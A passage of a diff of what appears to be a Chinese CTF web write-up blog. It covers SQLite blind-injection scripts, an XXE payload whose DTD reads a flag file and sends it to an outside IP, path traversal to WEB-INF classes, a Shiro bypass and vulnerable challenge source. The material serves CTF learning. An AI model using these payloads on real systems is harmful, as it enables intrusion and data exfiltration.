class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
 
 <p>没见过的sqlite，题解</p>
 <blockquote>
 <p>解题思路是利用sqlite逻辑报错进行盲注,abs函数存在整型溢出</p>
 <p>利用ifnull,nullif注入flag长度</p>
 </blockquote>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(ifnull(nullif(length((SELECT(flag)from(flag))),&#123;i&#125;),0x8000000000000000))</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(ifnull(nullif(length((SELECT(flag)from(flag))),&#123;i&#125;),0x8000000000000000))</span><br></pre></td></tr></table></figure>
 
 <p>这句语句的意思是，如果前面的length的值等于我们传入i的值，那么nullif就会返回null，如果返回了null那么ifnull就会返回后面的值，此时abs溢出报错，可以拿到flag长度</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>:<span class="string">f&#x27;abs(ifnull(nullif(length((SELECT(flag)from(flag))),<span class="subst">&#123;i&#125;</span>),0x8000000000000000))&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length: &#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>:<span class="string">f&#x27;abs(ifnull(nullif(length((SELECT(flag)from(flag))),<span class="subst">&#123;i&#125;</span>),0x8000000000000000))&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;length: &#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 <p>然后通过||来拼接字符，通过replace来进行逐位猜测，通过返回的长度来做判断，而对于字母则使用hex来提取</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span> <span class="comment"># &#x27;zebra&#x27; → &#x27;7A65627261&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span> <span class="comment"># &#x27;real&#x27; → &#x27;7265616C&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span> <span class="comment"># 0xffffffffffffffff = -1 → &#x27;2D31&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span> <span class="comment"># 0.1 → 302E31</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span> <span class="comment"># &#x27;dog&#x27; → &#x27;646F67&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span> <span class="comment"># &#x27;koala&#x27; → &#x27;6B6F616C61&#x27;</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span> <span class="comment"># &#x27;zebra&#x27; → &#x27;7A65627261&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span> <span class="comment"># &#x27;real&#x27; → &#x27;7265616C&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span> <span class="comment"># 0xffffffffffffffff = -1 → &#x27;2D31&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span> <span class="comment"># 0.1 → 302E31</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span> <span class="comment"># &#x27;dog&#x27; → &#x27;646F67&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span> <span class="comment"># &#x27;koala&#x27; → &#x27;6B6F616C61&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>最终通过<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#Sqlite-Voting" >脚本</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>拿到flag</p>
-
-        <h2 id="网鼎杯-2020-青龙组-filejava"   >
-          <a href="#网鼎杯-2020-青龙组-filejava" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2>
-      <p>一个上传，上传之后可以下载，看到链接里面有文件名，尝试目录穿越拿web.xml文件<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png"></p>
+<p>最终通过<a target="_blank" rel="noopener" href="https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#Sqlite-Voting">脚本</a>拿到flag</p>
+<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>一个上传，上传之后可以下载，看到链接里面有文件名，尝试目录穿越拿web.xml文件<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png"></p>
 <p>下载class（<code>../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code>）进行反编译，得到源码，我们直接看上传的关键部分</p>
-<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">		Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">		System.out.println(sheet.getFirstRowNum());</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">		System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;  </span><br></pre></td></tr></table></div></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">		Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">		System.out.println(sheet.getFirstRowNum());</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">		System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;  </span><br></pre></td></tr></table></figure>
 
 <p>此处使用<code>poi-ooxml-3.10</code>来解析数据，这个版本有漏洞可导致XXE，CVE-2014-3529</p>
 <p>那么就直接利用，首先在自己服务器上放一个f.dtd</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://182.61.46.138?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://182.61.46.138?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>然后更改xlsx中的[Content_Types].xml文件，添加如下内容</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://182.61.46.138/f.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://182.61.46.138/f.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
 <p>重新压缩上传即可接收flag</p>
-
-        <h2 id="HXBCTF-2021-easywill"   >
-          <a href="#HXBCTF-2021-easywill" class="heading-link"><i class="fas fa-link"></i></a><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h2>
-      <p>跟源码，后面再补</p>
-
-        <h2 id="羊城杯-2020-EasySer"   >
-          <a href="#羊城杯-2020-EasySer" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2>
-      <p>不给源码就是纯纯有病的谜语题，给了源码简单多了，正常序列化使用base64绕过die即可</p>
-
-        <h2 id="JMCTF-2021-UploadHub"   >
-          <a href="#JMCTF-2021-UploadHub" class="heading-link"><i class="fas fa-link"></i></a><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h2>
-      <p>.htaccess</p>
-
-        <h2 id="红明谷CTF-2021-JavaWeb"   >
-          <a href="#红明谷CTF-2021-JavaWeb" class="heading-link"><i class="fas fa-link"></i></a><a href="#红明谷CTF-2021-JavaWeb" class="headerlink" title="[红明谷CTF 2021]JavaWeb"></a>[红明谷CTF 2021]JavaWeb</h2>
-      <p>java，进去就是让我们login，login页面让我们访问json，但是没权限需要先登录，那就尝试传入登录，登录失败，但是看响应头<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210070120704.png"></p>
+<h2 id="HXBCTF-2021-easywill"><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h2><p>跟源码，后面再补</p>
+<h2 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2><p>不给源码就是纯纯有病的谜语题，给了源码简单多了，正常序列化使用base64绕过die即可</p>
+<h2 id="JMCTF-2021-UploadHub"><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h2><p>.htaccess</p>
+<h2 id="红明谷CTF-2021-JavaWeb"><a href="#红明谷CTF-2021-JavaWeb" class="headerlink" title="[红明谷CTF 2021]JavaWeb"></a>[红明谷CTF 2021]JavaWeb</h2><p>java，进去就是让我们login，login页面让我们访问json，但是没权限需要先登录，那就尝试传入登录，登录失败，但是看响应头<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210070120704.png"></p>
 <p>setCookie中的deleteMe可以确认使用的是shiro框架（我也不知道为啥</p>
 <p>那么首先使用CVE-2020-11989来进行Apache Shiro权限绕过，加个/;/json来直接访问json</p>
 <p>然后使用CVE-2019-14439的反序列化链打进去，用JNDI-Injection-Exploit来生成payload</p>
-
-        <h2 id="HCTF-2018-Hideandseek"   >
-          <a href="#HCTF-2018-Hideandseek" class="heading-link"><i class="fas fa-link"></i></a><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2>
-      <p>登录，任意输入除admin之外的用户名和密码，然后就让上传zip，第一件事就想到软连接，确实可以<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png"></p>
+<h2 id="HCTF-2018-Hideandseek"><a href="#HCTF-2018-Hideandseek" class="headerlink" title="[HCTF 2018]Hideandseek"></a>[HCTF 2018]Hideandseek</h2><p>登录，任意输入除admin之外的用户名和密码，然后就让上传zip，第一件事就想到软连接，确实可以<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png"></p>
 <p>那读一下源码吧，盲猜是个python，proc读试试，<del>事实证明直接莽是没什么卵子用的</del>，还是乖乖读了environ，然后/app/main.py读源码</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 